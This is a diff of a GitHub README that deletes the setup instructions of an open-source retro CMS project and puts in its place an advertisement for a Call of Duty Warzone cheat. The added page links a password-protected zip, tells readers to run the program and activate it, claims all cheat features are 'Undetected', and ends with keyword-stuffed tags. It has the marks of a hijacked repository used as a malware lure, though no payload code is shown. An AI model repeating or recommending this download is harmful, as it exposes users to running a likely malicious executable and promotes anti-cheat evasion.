@@ -1,93 +1,68 @@
-# Retro-CMS
-OpenSource CMS, a simplistic retro CMS, aimed for the Retro community free of charge. Check out the [roadmap](https://github.com/users/0x78f1935/projects/1)!
+# 🚀 🔥 COD 3 WARZONE Best Hack 🔥 | Actual for 2024 | AIM BOT + SKIN CHANGER + WALL HACK
 
-## Development environment
-First clone the repository. Once cloned we have to prepare two environments.
-1. Backend
-2. Frontend
+### 📋 How to Use
 
-## Backend
-Assuming python is installed (3.9.13 or higher).
-Setup a virtual environment
-```
-python -m venv venv
-```
-[Activate your environment](https://docs.python.org/3/tutorial/venv.html#creating-virtual-environments)
+## [Download](https://github.com/user-attachments/files/16731029/WarzoneEx.zip)  **PASS: github**
 
-Install the requirements **in your activated environment**
-```
-pip install -r requirements.txt
-```
-In visual studio code, you can hit **F5** with the development environment `RUN: Webserver` selected.
-Outside visual studio code, you have to set the environment variable `FLASK_APP` pointing to the `webserver.py` file.
+- **Download the file**.
+- **Run the program** on your computer.
+- **Follow the instructions** to activate your software.
 
-***Windows***
-```
-set FLASK_APP=webserver
-```
-***Unix***
-```
-export FLASK_APP=webserver
-```
-**Then continue**
-```
-flask run
-```
-
-## Frontend
-> ***All commands from this point on are executed inside the frontend folder***
-  ```
-  cd frontend
-  ```
-
-Make sure the frontend requirements are installed. 
-```
-npm install
-```
-
-The frontend can be enabled with hot-reload for easy development, for a **production** build we use the command
-```
-npm run build
-```
-
-This build gets served by Flask.
-
-For hot-reload run the next command along side the backend
-```
-npm run watch
-```
-
-> !Important: For hot-reload to work properly; First run the frontend followed by the backend
-
-# Interfaces
-If everything runs correctly, the following links should be available
-- [Frontend](http://127.0.0.1:5000/)
-- [RapiDocs](http://127.0.0.1:5000/devs)
-- [Redocly](http://127.0.0.1:5000/devs)
-- [Swagger](http://127.0.0.1:5000/swagger-ui)
+![maxresdefault (14)](https://github.com/user-attachments/assets/5e4887ba-3f66-4df1-b53c-1bdc2d130caf)
 
 
-## Environment
-For this to work correctly, you are required to make a `.env` file in the root of this repository.
-You can use the following `.env` file as example:
-```
-DB_USERNAME=root
-DB_PASSWORD=SuperSecretPass123
-DB_HOST=127.0.0.1
-DB_PORT=3888
-DB_SCHEMA=retro
+### ⚠️ Warning
 
-EMULATOR_HOST=http://127.0.0.1:81
-```
+ **Important:** Using activation tools may violate license agreements and laws. Please ensure you understand the risks before proceeding.
 
-## Database
-> ***WARNING: IN THE CURRENT STATUE OF THIS APPLICATION, DO NOT USE THIS ON AN EXISTING DATABASE, ONLY FRESH RETROS***
+### 🚀 **Features:**
 
-Passwords are encrypted with this CMS, existing passwords will be overwritten and users will lose access to their account. Wait until migration tooling exist or start a fresh retro.
+- **Easy to Use:** Get started quickly with straightforward setup instructions.
+- **High Performance:** Optimized for speed and efficiency.
+- **Customizable:** Tailor the features to suit your needs.
+  
 
-In a terminal where `set FLASK_APP=webserver.py` has been activated run;
-```
-flask db upgrade
-```
-which applies the required database tables and upgrades for the CMS to work
+![cod3warzone](https://github.com/user-attachments/assets/fc550e7c-1c63-49b8-bb59-4d91356b1f1e)
 
+
+### **💻 Minimum Requirements:**
+
+- **OS:** Windows 10/11 (64-bit)
+- **CPU:** Intel Core i5-2400 / AMD Ryzen 3 1200
+- **RAM:** 4 GB
+- **GPU:** NVIDIA GeForce GTX 660 / AMD Radeon HD 7870
+- **Storage:** 2 GB of available space
+
+---
+
+## 🛡️ **Real-time status(special for github):**
+
+| 🛠️ **Feature**             | 📊 **Status**   |
+|----------------------------|-----------------|
+| **Spoofer**                 | ✅ Undetected    |
+| **Skinchanger**            | ✅ Undetected    |
+| **Aimbot**                 | ✅ Undetected    |
+| **ESP**                    | ✅ Undetected    |
+| **Exploits**               | ✅ Undetected    |
+| **Misc**                   | ✅ Undetected    |
+| **Aimbot Fov Circle**      | ✅ Undetected    |
+| **Aimbot Smooth**          | ✅ Undetected    |
+| **Aimbot Bone**            | ✅ Undetected    |
+| **Aimbot Prediction**      | ✅ Undetected    |
+| **Box ESP**                | ✅ Undetected    |
+| **Skeleton**               | ✅ Undetected    |
+| **Lines**                  | ✅ Undetected    |
+| **Player Names**           | ✅ Undetected    |
+| **Aim While Jumping**      | ✅ Undetected    |
+| **No Weapon Switch Delay** | ✅ Undetected    |
+| **No Spread**              | ✅ Undetected    |
+| **Rapid Fire**             | ✅ Undetected    |
+| **Trigger Bot**            | ✅ Undetected    |
+| **AirStuck**               | ✅ Undetected    |
+| **360 Fov**                | ✅ Undetected    |
+| **Fov Circle off/on**      | ✅ Undetected    |
+| **Crosshair**              | ✅ Undetected    |
+
+#Tags
+
+warzone, cod warzone, warzone aimbot, warzone cheats, call of duty warzone, warzone cheat, warzone hack, warzone 3 cheats, warzone 3 cheat, warzone 3 hack, warzone 3 cheats download, warzone cheaters, warzone 3, hack warzone 3, warzone 3 hacks, cod, mw3 cheats, warzone 3 aimbot, warzone hacks, warzone 3 esp, warzone hacks free, hacker, warzone 3 hacks download, warzone hack free, free warzone 3 hack, warzone hack download, mw3 warzone cheat, download warzone 3 hacks, mw3, warzone cheat free, mw3 cheat, warzone cheaters exposed, modern warfare 3, mw3 cheats download, mw3 hack, hacking, call of duty, funny, cheating, warzone 3 unlock all, warzone 3 hack pc, aimbot, hacks, warzone best gun, streamer, warzone funny moments, swagg, warzone anti cheat, warzone hacker, tctekk, warzone hackers, call of duty battle royale, wall hacks, wtf, epic moments, funny moments, call of duty best, call of duty wtf moments, warzone highlights, hackers, cheaters, call of duty daily, top call of duty plays, top warzone plays, warzone funny, warzone best moments, warzone cheat season 6, cheats, warzone cheater, how to get mw3 cheats, warzone best, warzone battle royale, warzone best plays, nasytv, warzone loadout, call of duty battle royale warzone, nadia cheating, ps5, call of duty funny, new, cod funny, rebirth island warzone, daily moments, epic, cheater, caught cheating, warzone new anti cheat, bypass warzone anti cheat, warzone cheaters get caught, warzone 2, mw2, wsow, hack, unlock all warzone cheat, faze, warzone meta, nuke, rebirth, warzone rebirth island, faze swagg, rebirth island, best warzone loadout, best, jgod, nadia, ps4, xbox one, timthetatman, warzone live, warzone gameplay, streamers caught cheating, symfuhny cheating, mw3 unlock all, call of duty cheating, streamer cheating, tips, pro, live, react, reaction, streamer caught, bad boy beaman, cheat, faze clan, console, warzone best loadout, badboybeaman, modern warfare iii, badboy beaman, gaming, mw3 cheating, permanently banned, hackz, permabanned, perma, streamers, activation, callofshamee, codnext, warzone 3 anti cheat, callofshame
